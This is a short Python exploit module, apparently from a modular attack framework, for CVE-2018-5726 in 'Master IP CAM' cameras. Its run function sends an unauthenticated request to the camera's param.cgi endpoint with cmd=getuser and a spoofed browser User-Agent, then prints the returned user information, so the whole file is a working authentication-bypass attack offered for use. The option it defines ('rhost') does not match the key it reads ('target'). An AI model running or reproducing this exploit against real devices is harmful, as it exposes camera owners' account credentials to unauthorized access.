import requests
from json import dumps
from modules._module import Module
from utils.custom_print import print_info, print_error
from utildata.dataset_options import Option


class HomeModule(Module):

    def __init__(self):
        information = {"Name": "CVE-2018-5726",
                       "Description": "This module allows you to get information ftom a Marter IP CAM bypassing authentication exploiting the vulnerability with CVE-2018-5726.",
                       "Author": "@josueencinar",
                       "Reference": "https://syrion.me/blog/master-ipcam/"}

        # -----------name-----default_value--description--required?
        options = {"rhost": Option.create(name="rhost", required=True)}

        # Constructor of the parent class
        super(HomeModule, self).__init__(information, options)

    # This function must be always implemented, it is called by the run option
    def run(self):
        url = f"http://{self.args['target']}/web/cgi-bin/hi3510/param.cgi?cmd=getuser"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
        }
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
           for line in response.text.split("\n"):
               print_info(line)
        else:
            print_error(f"Response code: {response.status_code}")